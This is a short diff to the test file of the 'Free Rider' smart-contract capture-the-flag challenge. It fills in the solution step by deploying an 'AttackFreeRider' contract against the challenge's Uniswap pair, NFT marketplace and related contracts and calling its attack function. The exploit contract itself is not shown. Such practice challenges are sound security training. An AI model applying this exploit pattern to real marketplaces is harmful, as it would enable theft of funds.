@@ -106,6 +106,9 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackFreeRiderFactory = await ethers.getContractFactory('AttackFreeRider', player);
+        const attackContract = await AttackFreeRiderFactory.deploy(uniswapPair.address, marketplace.address, devsContract.address, weth.address, nft.address);
+        await attackContract.connect(player).attack();
     });
 
     after(async function () {
